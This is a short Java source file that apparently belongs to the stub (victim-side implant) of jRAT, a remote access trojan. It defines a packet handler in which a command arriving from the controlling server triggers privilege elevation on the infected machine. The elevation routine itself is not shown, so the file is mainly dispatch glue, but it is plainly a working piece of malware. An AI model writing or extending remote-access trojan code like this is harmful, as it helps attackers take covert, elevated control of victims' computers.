package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Elevation;

public class Packet100RequestElevation extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Elevation.executeElevation();
	}

}
